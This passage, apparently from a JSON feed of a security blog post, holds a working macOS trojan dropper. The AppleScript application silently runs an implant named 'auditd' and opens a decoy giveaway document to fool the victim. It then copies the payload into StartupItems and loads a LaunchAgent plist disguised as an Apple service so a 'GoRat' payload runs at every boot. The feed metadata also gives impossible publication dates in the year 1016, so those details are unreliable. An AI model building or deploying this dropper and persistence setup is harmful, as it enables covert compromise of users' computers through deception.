below. See the comments to understand the different statements used in the script. When saving the script, make sure to save it as an \u0026ldquo;Application\u0026rdquo; under File Format.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-applescript\" data-lang=\"applescript\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#set myPath to path to me as text # creates and sets the myPath variable to be the path to the app\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#if myPath ends with \u0026#34;:\u0026#34; then # depending on whether or not the path ends with a colon, set the offset to get the current app\u0026#39;s name\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#\tset n to -2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#else\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#\tset n to -1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#end if\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#set AppleScript\u0026#39;s text item delimiters to \u0026#34;:\u0026#34; # set the delimiters to be colons as used in the myPath variable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#set myName to text item n of myPath # set myName variable to the nth item, which should be the [appName].app\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#if (myName contains \u0026#34;.\u0026#34;) then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#\tset AppleScript\u0026#39;s text item delimiters to \u0026#34;.\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#\tset myName to text item -2 of myName\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#end if # get just the name before the .app\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# the section above is useful to create a variable with the app\u0026#39;s name\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edo shell script \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;FILE=\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e (path to \u003cspan style=\"color:#66d9ef\"\u003eme\u003c/span\u003e)\u0026#39;s POSIX \u003cspan style=\"color:#a6e22e\"\u003epath\u003c/span\u003e\u0026#39;s quoted form \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; # get the path to current directory\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003ecd $FILE || exit; chmod +x ./Contents/auditd; ./Contents/auditd \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# cd to directory and execute implant\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edo shell script \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;FILE=\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e (path to \u003cspan style=\"color:#66d9ef\"\u003eme\u003c/span\u003e)\u0026#39;s POSIX \u003cspan style=\"color:#a6e22e\"\u003epath\u003c/span\u003e\u0026#39;s quoted form \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003ecd $FILE || exit; open ./Contents/Independence-Day-Swag-Giveaway-Form2021.docx \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# open decoy docx\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edo shell script \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;FILE=\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e (path to \u003cspan style=\"color:#66d9ef\"\u003eme\u003c/span\u003e)\u0026#39;s POSIX \u003cspan style=\"color:#a6e22e\"\u003epath\u003c/span\u003e\u0026#39;s quoted form \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003ecd $FILE || exit; mkdir -p ~/Library/StartupItems/; mkdir -p ~/Library/LaunchAgents/\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# create payload directories in case they don\u0026#39;t exist\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edo shell script \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;FILE=\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e (path to \u003cspan style=\"color:#66d9ef\"\u003eme\u003c/span\u003e)\u0026#39;s POSIX \u003cspan style=\"color:#a6e22e\"\u003epath\u003c/span\u003e\u0026#39;s quoted form \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003ecd $FILE || exit; cp -r ./Contents/auditd ~/Library/StartupItems/\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# copy payload to persistence destination\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edo shell script \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;FILE=\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e (path to \u003cspan style=\"color:#66d9ef\"\u003eme\u003c/span\u003e)\u0026#39;s POSIX \u003cspan style=\"color:#a6e22e\"\u003epath\u003c/span\u003e\u0026#39;s quoted form \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003ecd $FILE || exit; cp -r ./Contents/com.apple.auditd.plist ~/Library/LaunchAgents/; launchctl load ~/Library/LaunchAgents/com.apple.auditd.plist \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# copy plist to destination and create persistent service\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThe following plust defines the service that will start the GoRat payload on boot. Use \u003ccode\u003elaunchctl load [path to plist]\u003c/code\u003e to have the service start automatically on each boot (and the first time without reboot since RunAtLoad is set).\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u0026lt;dict\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u0026lt;key\u0026gt;Label\u0026lt;/key\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u0026lt;string\u0026gt;auditd\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u0026lt;key\u0026gt;ProgramArguments\u0026lt;/key\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u0026lt;array\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u0026lt;string\u0026gt;zsh\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u0026lt;string\u0026gt;-c\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u0026lt;string\u0026gt;~/Library/StartupItems/auditd\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u0026lt;string\u0026gt;--no-window\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u0026lt;/array\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u0026lt;key\u0026gt;RunAtLoad\u0026lt;/key\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u0026lt;true/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u0026lt;/dict\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026lt;/plist\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e",
      "url": "https://potat0ast.com/1/01/01/persistent_mac_payload/",
      "image": "https://potat0ast.com/photos/<no value>",
      "banner_image": "https://potat0ast.com/photos/<no value>",
      "date_published": "1016-01-09T10:11:00+00:00",
      "date_modified": "1016-01-09T10:11:00+00:00",
      "author": {
        "name": "Ronalds Vilcins",
        "url": "https://ronaldsvilcins.com/"
      }
    }
    
  ]
}
